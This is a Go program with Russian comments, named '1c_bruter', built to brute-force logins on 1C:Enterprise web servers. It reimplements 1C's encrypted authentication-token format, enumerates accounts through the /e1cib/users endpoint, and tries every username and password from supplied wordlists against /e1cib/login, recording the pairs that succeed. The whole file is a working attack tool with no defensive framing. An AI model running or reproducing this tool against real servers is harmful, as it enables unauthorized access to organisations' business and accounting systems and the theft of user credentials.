package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"hash/crc32"
	"io"
	"log"
	"net/http"
	"os"
	"regexp"
	"sort"
	"strings"
)

// FIXED_IV используется для AES-CBC (для совместимости с 1С)
var FIXED_IV = []byte{157, 123, 154, 32, 105, 101, 187, 40, 6, 122, 72, 61, 178, 108, 113, 142}

// pad выполняет PKCS#7 padding.
func pad(src []byte, blockSize int) []byte {
	padding := blockSize - len(src)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(src, padtext...)
}

// encryptAESCBC шифрует данные в режиме AES-CBC с PKCS#7 padding.
func encryptAESCBC(key, plaintext, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	plaintext = pad(plaintext, block.BlockSize())
	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, plaintext)
	return ciphertext, nil
}

// sha1Base64 вычисляет SHA1-хеш строки и возвращает его base64-кодировку.
func sha1Base64(s string) string {
	h := sha1.Sum([]byte(s))
	return base64.StdEncoding.EncodeToString(h[:])
}

// generateAuthToken генерирует токен аутентификации по алгоритму 1С.
func generateAuthToken(password, username string) (string, error) {
	var tokenBytes bytes.Buffer

	// Версия токена: 1
	tokenBytes.WriteByte(1)

	// Первый блок шифрования
	randomBlock1 := make([]byte, 32)
	if _, err := rand.Read(randomBlock1); err != nil {
		return "", err
	}
	key1Data := []byte(sha1Base64(password))
	key1 := sha256.Sum256(key1Data)
	encryptedBlock1, err := encryptAESCBC(key1[:], randomBlock1, FIXED_IV)
	if err != nil {
		return "", err
	}
	tokenBytes.WriteByte(byte(len(encryptedBlock1)))
	tokenBytes.Write(encryptedBlock1)

	// Второй блок шифрования с password в верхнем регистре
	randomBlock2 := make([]byte, 32)
	if _, err := rand.Read(randomBlock2); err != nil {
		return "", err
	}
	key2Data := []byte(sha1Base64(strings.ToUpper(password)))
	key2 := sha256.Sum256(key2Data)
	encryptedBlock2, err := encryptAESCBC(key2[:], randomBlock2, FIXED_IV)
	if err != nil {
		return "", err
	}
	tokenBytes.WriteByte(byte(len(encryptedBlock2)))
	tokenBytes.Write(encryptedBlock2)

	// Добавление имени пользователя: 4 байта длины (little-endian) + имя
	usernameBytes := []byte(username)
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, uint32(len(usernameBytes)))
	tokenBytes.Write(lenBuf)
	tokenBytes.Write(usernameBytes)

	// Вычисление CRC32 для всех ранее записанных байт и добавление (4 байта, little-endian)
	crc := crc32.ChecksumIEEE(tokenBytes.Bytes())
	crcBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(crcBuf, crc)
	tokenBytes.Write(crcBuf)

	return base64.StdEncoding.EncodeToString(tokenBytes.Bytes()), nil
}

// getVersion делает GET-запрос к URL и извлекает версию по регулярному выражению.
func getVersion(baseURL string) (string, error) {
	resp, err := http.Get(baseURL + "/")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	re := regexp.MustCompile(`var VERSION = "([0-9\.]+)"`)
	matches := re.FindStringSubmatch(string(bodyBytes))
	if len(matches) >= 2 {
		return matches[1], nil
	}
	return "", fmt.Errorf("не удалось извлечь версию")
}

// authenticate посылает POST-запрос с JSON-данными для аутентификации.
func authenticate(baseURL, version, credentials string) (bool, error) {
	postURL := fmt.Sprintf("%s/e1cib/login?version=%s", baseURL, version)
	payload := map[string]string{
		"cred": credentials,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return false, err
	}
	req, err := http.NewRequest("POST", postURL, bytes.NewReader(jsonData))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	return resp.StatusCode == http.StatusOK, nil
}

// fetchUsers получает список пользователей с сервера.
func fetchUsers(baseURL string) ([]string, error) {
	resp, err := http.Get(baseURL + "/e1cib/users")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	users := strings.Split(string(bodyBytes), "\r\n")
	var trimmed []string
	for _, u := range users {
		u = strings.TrimSpace(u)
		if u != "" {
			trimmed = append(trimmed, u)
		}
	}
	return trimmed, nil
}

// checkCredentials генерирует токен и проверяет учетные данные.
func checkCredentials(baseURL, version, username, password string) bool {
	token, err := generateAuthToken(password, username)
	if err != nil {
		log.Printf("Ошибка генерации токена для %s: %v", username, err)
		return false
	}
	ok, err := authenticate(baseURL, version, token)
	if err != nil {
		log.Printf("Ошибка аутентификации для %s: %v", username, err)
		return false
	}
	return ok
}

// loadLinesFromFile загружает строки из файла.
func loadLinesFromFile(filename string) ([]string, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	lines := strings.Split(string(data), "\n")
	var trimmed []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			trimmed = append(trimmed, line)
		}
	}
	return trimmed, nil
}

// uniqueStrings убирает дубликаты и сортирует строки.
func uniqueStrings(input []string) []string {
	seen := make(map[string]bool)
	var result []string
	for _, s := range input {
		if !seen[s] {
			seen[s] = true
			result = append(result, s)
		}
	}
	sort.Strings(result)
	return result
}

func main() {
	// Определение флагов командной строки
	userFlag := flag.String("u", "", "Имя пользователя для проверки пароля")
	usersFileFlag := flag.String("U", "", "Файл со списком пользователей")
	passwordFlag := flag.String("p", "", "Пароль для перебора")
	passwordFlagSet := false
	passwordsFileFlag := flag.String("P", "", "Файл со списком паролей")
	getUsersFlag := flag.Bool("l", false, "Получить список пользователей из информационной базы")
	outputFlag := flag.String("o", "", "Файл для сохранения результатов")
	flag.Parse()

	// Проверяем, был ли явно указан флаг -p
	for _, arg := range os.Args[1:] {
		if arg == "-p" || strings.HasPrefix(arg, "-p=") {
			passwordFlagSet = true
			break
		}
	}

	// Получаем URL из позиционного аргумента
	args := flag.Args()
	if len(args) < 1 {
		log.Fatal("URL не указан! Использование: 1c_bruter [-u USER] [-U FILE] [-p PASSWORD] [-P FILE] [-l] [-o OUTPUT] URL")
	}
	baseURL := args[0]

	if !strings.HasPrefix(baseURL, "http") {
		log.Fatalf("%s не является корректным URL!", baseURL)
	}

	// Получаем версию информационной базы
	version, err := getVersion(baseURL)
	if err != nil || version == "" {
		log.Fatalf("Не удалось определить версию! URL: %s, ошибка: %v", baseURL, err)
	}
	log.Printf("Версия: %s", version)

	// Режим только получения списка пользователей
	if *getUsersFlag && *userFlag == "" && *usersFileFlag == "" && !passwordFlagSet && *passwordsFileFlag == "" {
		users, err := fetchUsers(baseURL)
		if err != nil {
			log.Fatalf("Не удалось получить список пользователей: %v", err)
		}
		if len(users) == 0 {
			log.Fatal("Не удалось получить список пользователей!")
		}
		log.Printf("Найдено пользователей: %d", len(users))
		for _, user := range users {
			fmt.Println(user)
		}
		if *outputFlag != "" {
			err := os.WriteFile(*outputFlag, []byte(strings.Join(users, "\n")), 0644)
			if err != nil {
				log.Printf("Ошибка сохранения: %v", err)
			} else {
				log.Printf("Список пользователей сохранён в %s", *outputFlag)
			}
		}
		os.Exit(0)
	}

	// Загружаем пользователей
	var users []string
	if *userFlag != "" {
		users = append(users, *userFlag)
	}
	if *usersFileFlag != "" {
		lines, err := loadLinesFromFile(*usersFileFlag)
		if err != nil {
			log.Printf("Ошибка чтения файла с пользователями: %v", err)
		} else {
			users = append(users, lines...)
		}
	}
	if *getUsersFlag {
		fetched, err := fetchUsers(baseURL)
		if err != nil {
			log.Printf("Ошибка получения пользователей: %v", err)
		} else {
			users = append(users, fetched...)
		}
	}
	users = uniqueStrings(users)
	if len(users) == 0 {
		log.Fatal("Пользователи не загружены!")
	}

	// Загружаем пароли
	var passwords []string
	if passwordFlagSet {
		passwords = append(passwords, *passwordFlag)
	}
	if *passwordsFileFlag != "" {
		lines, err := loadLinesFromFile(*passwordsFileFlag)
		if err != nil {
			log.Printf("Ошибка чтения файла с паролями: %v", err)
		} else {
			passwords = append(passwords, lines...)
		}
	}
	if len(passwords) == 0 {
		log.Fatal("Пароли не загружены!")
	}

	// Перебор комбинаций пользователей и паролей
	var results []string
	for _, password := range passwords {
		for _, username := range users {
			if checkCredentials(baseURL, version, username, password) {
				result := fmt.Sprintf("%s:%s", username, password)
				results = append(results, result)
				log.Printf("[+] Успешная аутентификация! Пользователь: %s, Пароль: %s", username, password)
			}
		}
	}

	// Сохранение результатов в файл
	if *outputFlag != "" && len(results) > 0 {
		err := os.WriteFile(*outputFlag, []byte(strings.Join(results, "\n")), 0644)
		if err != nil {
			log.Printf("Ошибка сохранения результатов: %v", err)
		} else {
			log.Printf("Результаты сохранены в %s", *outputFlag)
		}
	}
}
